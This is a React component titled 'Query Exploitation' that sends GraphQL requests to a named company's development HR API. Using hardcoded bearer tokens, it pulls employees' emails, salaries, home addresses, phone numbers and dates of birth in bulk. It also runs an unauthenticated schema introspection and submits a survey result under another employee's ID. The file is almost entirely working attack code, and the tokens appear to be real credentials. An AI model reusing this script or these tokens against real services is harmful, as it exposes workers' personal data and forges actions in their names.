import React, { useState } from "react";

function Exploitation({ ...pageProps }) {
  const [jsonData, setJsonData] = useState([]);
  const [schemeExploitation, setSchemeExploitation] = useState([]);

  const query = `{
    me {
        id
        first_name
        last_name
        email
        profile_picture
        role_id
        user_type
        role {
          permission_paths
          permissions {
            value
            label
            path
            items {
              value
              path
              label
              items {
                value
                path
                label
                items {
                  value
                  path
                  label
                  items {
                    label
                    path
                    value
                    items {
                      label
                      path
                      value
                      items {
                        label
                        path
                        value
                        items {
                          label
                          path
                          value
                          items {
                            label
                            path
                            value
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        employee {
          personal_details {
            id
          }
        }
      }
    }

    employeeNotes(employee_id: 10) {
      data {
        employee {
            hris_id
          }
      }
    }
  
    birthdays {
      employees_this_month {
        user {
          id
          email
          role_id
  
          role {
            role_name
          }
  
          employee {
            employment_details {
              employee_number
            }
          }
        }
        work_information {
          gross_salary
        }
  
        contact_information {
          email
        }
      }
    }
  
  
    anniversaries_report {
      employees_this_month {
        user {
          id
          email
          role_id
  
          role {
            role_name
          }
  
          employee {
            employment_details {
              employee_number
            }
          }
        }
      }
    }
  
    posts (pagination: {page_number: 1, page_size: 100000}) {
      values {
        reactions {
          users {
            email
            id
            user_type
            
            addresses {
              line_1
              line_2
              city
              state
              zip
            }
  
            personal_details {
              phone_number
              date_of_birth
              first_name
              last_name
              middle_name
              user_id
            }
  
            primary_address {
              line_1
              line_2
              city
              state
              zip
            }
          }
        }
      }
    }
  }
  `;

  fetch("https://api-dev.pulse.outsourced.ph/graphql", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization:
        "Bearer 4087|XlSQFepr59SupR1E5LaJLSMmQnCEnhAyLokjWvdP6e1c9de1",
    },
    body: JSON.stringify({
      query: query,
    }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }

      return response.json(); // Parse the response JSON
    })
    .then((data) => {
      setJsonData(data);
      console.log("User created:", data);
    })
    .catch((error) => {
      console.error("Error executing GraphQL mutation:", error);
    });

  const introspection = `
      {
        __schema {
          queryType {
            name
          }
          mutationType {
            name
          }
          subscriptionType {
            name
          }
          types {
            ...FullType
          }
          directives {
            name description locations args {
              ...InputValue
            }
          }
        }
      }
      fragment FullType on __Type {
        kind name description fields(includeDeprecated: true) {
          name description args {
            ...InputValue
          }
          type {
            ...TypeRef
          }
          isDeprecated deprecationReason
        }
        inputFields {
          ...InputValue
        }
        interfaces {
          ...TypeRef
        }
        enumValues(includeDeprecated: true) {
          name description isDeprecated deprecationReason
        }
        possibleTypes {
          ...TypeRef
        }
      }
      fragment InputValue on __InputValue {
        name description type {
          ...TypeRef
        }
        defaultValue
      }
      fragment TypeRef on __Type {
        kind name ofType {
          kind name ofType {
            kind name ofType {
              kind name ofType {
                kind name ofType {
                  kind name ofType {
                    kind name ofType {
                      kind name
                    }
                  }
                }
              }
            }
          }
        }
      }
        `;

  fetch("https://api-dev.pulse.outsourced.ph/graphql", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      query: introspection,
    }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }

      return response.json(); // Parse the response JSON
    })
    .then((data) => {
      setSchemeExploitation(data);
      console.log("User created:", data);
    })
    .catch((error) => {
      console.error("Error executing GraphQL mutation:", error);
    });

  return (
    <div className="p-10">
      <h1>Query Exploitation</h1>
      <div className="flex gap-4">
        <div className=" w-1/2 border border-gray-400 p-4 text-wrap">
          <h2>Introspection</h2>
          <pre className="text-wrap break-words">
            {JSON.stringify(schemeExploitation, null, 2)}
          </pre>
        </div>

        <div className=" w-1/2 border border-gray-400 p-4 text-wrap">
          <h2>Data Exploitation</h2>
          <pre className="text-wrap break-words">
            {JSON.stringify(jsonData, null, 2)}
          </pre>
        </div>
      </div>
    </div>
  );
}

export default Exploitation;

const mutationQuery = `
  mutation {
      submitHappinessSurveyResult(
        values: { employee_id: 2175, rating: 10, comment: "awesome perfect" }
      ) {
        field_validation_messages
        debug_message
        message
        success
      }
  }
`;
fetch("https://api-dev.pulse.outsourced.ph/graphql", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    Authorization:
      "Bearer 4093|X4VBB4JTAaQJebOJzUYUdoRCQBIx9QSe2O6crhJT26f0e32f",
  },
  body: JSON.stringify({
    query: mutationQuery,
  }),
})
  .then((response) => {
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    return response.json(); // Parse the response JSON
  })
  .then((data) => {
    console.log("User created:", data);
  })
  .catch((error) => {
    console.error("Error executing GraphQL mutation:", error);
  });
